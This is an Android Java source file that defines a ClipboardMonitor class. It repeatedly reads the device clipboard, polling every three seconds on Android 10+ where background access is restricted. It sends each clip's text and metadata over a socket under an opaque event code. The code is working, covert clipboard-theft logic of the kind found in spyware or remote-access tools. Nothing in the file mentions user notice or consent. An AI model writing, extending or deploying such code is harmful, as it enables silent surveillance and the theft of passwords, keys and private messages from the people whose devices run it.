package com.fason.app.features.clipboard;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.text.TextUtils;

import com.fason.app.core.network.SocketClient;

import org.json.JSONObject;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;

public final class ClipboardMonitor {

    private static final long POLL_INTERVAL_MS = 3000; // 3 seconds polling interval
    private static final long LISTENER_CHECK_INTERVAL_MS = 30000; // 30 seconds

    private static ClipboardMonitor instance;
    private final Context ctx;
    private final Handler mainHandler;
    private final ExecutorService executor;

    private ClipboardManager clipboardManager;
    private ClipboardManager.OnPrimaryClipChangedListener clipListener;
    private final AtomicBoolean isRunning = new AtomicBoolean(false);
    private final AtomicBoolean usePolling = new AtomicBoolean(false);

    private String lastText;
    private long lastEmitTime = 0;
    private static final long MIN_EMIT_INTERVAL = 1000; // 1 second minimum between emissions

    private final Runnable pollRunnable = new Runnable() {
        @Override
        public void run() {
            if (!isRunning.get()) return;

            pollClipboard();

            // Schedule next poll
            if (usePolling.get()) {
                mainHandler.postDelayed(this, POLL_INTERVAL_MS);
            }
        }
    };

    private final Runnable listenerCheckRunnable = new Runnable() {
        @Override
        public void run() {
            if (!isRunning.get()) return;

            // Check if listener is still registered, if not switch to polling
            if (clipboardManager != null && clipListener != null) {
                try {
                    // Try to emit current clipboard to verify listener works
                    if (!usePolling.get()) {
                        emit(true);
                    }
                } catch (Exception e) {
                    // Listener might have died, switch to polling
                    usePolling.set(true);
                    startPolling();
                }
            }

            mainHandler.postDelayed(this, LISTENER_CHECK_INTERVAL_MS);
        }
    };

    private ClipboardMonitor(Context context) {
        this.ctx = context.getApplicationContext();
        this.mainHandler = new Handler(Looper.getMainLooper());
        this.executor = Executors.newSingleThreadExecutor();
    }

    public static synchronized ClipboardMonitor getInstance(Context context) {
        if (instance == null) {
            instance = new ClipboardMonitor(context);
        }
        return instance;
    }

    public synchronized void start() {
        if (isRunning.getAndSet(true)) return; // Already running

        if (clipboardManager == null) {
            clipboardManager = (ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
        }

        if (clipboardManager == null) {
            isRunning.set(false);
            return;
        }

        // On Android 10+ (API 29+), clipboard access in background is restricted
        // Use polling as the primary method
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            usePolling.set(true);
            startPolling();
        } else {
            // On older versions, try listener first
            startListener();
        }

        // Start listener health check
        mainHandler.postDelayed(listenerCheckRunnable, LISTENER_CHECK_INTERVAL_MS);

        // Emit initial state
        executor.execute(() -> emit(true));
    }

    private void startListener() {
        if (clipboardManager == null || clipListener != null) return;

        try {
            clipListener = () -> {
                if (isRunning.get()) {
                    executor.execute(() -> emit(false));
                }
            };
            clipboardManager.addPrimaryClipChangedListener(clipListener);
            usePolling.set(false);
        } catch (Exception e) {
            // Listener registration failed, use polling
            usePolling.set(true);
            startPolling();
        }
    }

    private void startPolling() {
        mainHandler.removeCallbacks(pollRunnable);
        mainHandler.post(pollRunnable);
    }

    public synchronized void stop() {
        if (!isRunning.getAndSet(false)) return; // Already stopped

        mainHandler.removeCallbacks(pollRunnable);
        mainHandler.removeCallbacks(listenerCheckRunnable);

        if (clipboardManager != null && clipListener != null) {
            try {
                clipboardManager.removePrimaryClipChangedListener(clipListener);
            } catch (Exception ignored) {}
        }

        clipListener = null;
        lastText = null;
        usePolling.set(false);
    }

    public synchronized void emitClipboardSnapshot() {
        if (!isRunning.get()) {
            // Temporarily enable to get current clipboard
            emit(true);
        } else {
            emit(true);
        }
    }

    private void pollClipboard() {
        if (clipboardManager == null) {
            clipboardManager = (ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
        }

        if (clipboardManager == null) return;

        try {
            if (clipboardManager.hasPrimaryClip()) {
                emit(false);
            }
        } catch (Exception ignored) {
            // Clipboard access might be restricted
        }
    }

    private void emit(boolean allowDup) {
        if (clipboardManager == null) {
            clipboardManager = (ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
        }

        if (clipboardManager == null) return;

        try {
            if (!clipboardManager.hasPrimaryClip()) return;

            ClipData clip = clipboardManager.getPrimaryClip();
            if (clip == null || clip.getItemCount() == 0) return;

            CharSequence text = clip.getItemAt(0).getText();
            if (TextUtils.isEmpty(text)) return;

            String s = text.toString();

            // Check for duplicate
            if (!allowDup && s.equals(lastText)) return;

            // Rate limiting
            long now = System.currentTimeMillis();
            if (!allowDup && (now - lastEmitTime) < MIN_EMIT_INTERVAL) return;

            JSONObject data = new JSONObject();
            data.put("text", s);
            data.put("timestamp", now);
            data.put("length", s.length());

            // Get clip description if available
            if (clip.getDescription() != null) {
                data.put("label", clip.getDescription().getLabel());
                data.put("mimeType", clip.getDescription().getMimeType(0));
            }

            SocketClient.getInstance().getSocket().emit("0xCB", data);

            lastText = s;
            lastEmitTime = now;
        } catch (Exception e) {
            // On Android 10+, background clipboard access throws exception
            // This is expected behavior - the polling will continue trying
        }
    }

    public boolean isRunning() {
        return isRunning.get();
    }

    public boolean isUsingPolling() {
        return usePolling.get();
    }

    public void shutdown() {
        stop();
        executor.shutdown();
    }
}
